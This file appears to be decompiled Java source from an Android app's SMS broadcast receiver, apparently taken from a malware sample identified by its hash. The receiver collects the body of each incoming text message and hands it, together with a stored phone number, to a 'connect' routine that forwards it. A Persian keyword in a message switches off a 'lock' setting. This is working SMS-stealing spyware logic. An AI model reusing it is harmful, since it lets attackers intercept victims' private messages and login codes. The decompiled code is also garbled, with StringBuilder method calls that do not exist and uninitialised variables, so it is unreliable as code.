package ir.siqe.holo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class MyReceiver extends BroadcastReceiver {
  public void onReceive(Context paramContext, Intent paramIntent) {
    StringBuilder stringBuilder1;
    String str2;
    byte b = 0;
    SharedPreferences sharedPreferences = paramContext.getSharedPreferences("info", 0);
    SharedPreferences.Editor editor = sharedPreferences.edit();
    Bundle bundle = paramIntent.getExtras();
    String str3 = "";
    String str1 = str3;
    if (bundle != null) {
      Object[] arrayOfObject = (Object[])bundle.get("pdus");
      int i = arrayOfObject.length;
      SmsMessage[] arrayOfSmsMessage = new SmsMessage[i];
      while (true) {
        str1 = str3;
        if (b < i) {
          arrayOfSmsMessage[b] = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
          StringBuilder stringBuilder3 = new StringBuilder();
          stringBuilder3.append(str3);
          stringBuilder3.append("\r\n");
          String str = stringBuilder3.toString();
          StringBuilder stringBuilder4 = new StringBuilder();
          stringBuilder4.append(str);
          stringBuilder4.append(arrayOfSmsMessage[b].getMessageBody().toString());
          str2 = stringBuilder4.toString();
          stringBuilder1 = new StringBuilder();
          stringBuilder1.append(str2);
          stringBuilder1.append("\r\n");
          str2 = stringBuilder1.toString();
          b++;
          continue;
        } 
        break;
      } 
    } 
    if (stringBuilder1.contains("سایت شب")) {
      editor.putString("lock", "off");
      editor.commit();
    } 
    StringBuilder stringBuilder2 = stringBuilder1;
    if (stringBuilder1.contains("\n"))
      str2 = stringBuilder1.replaceAll("\n", " "); 
    new connect(sharedPreferences.getString("phone", "0"), str2, paramContext);
  }
}


/* Location:              C:\Users\Jason\Downloads\355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082-dex2jar.jar!\ir\siqe\holo\MyReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */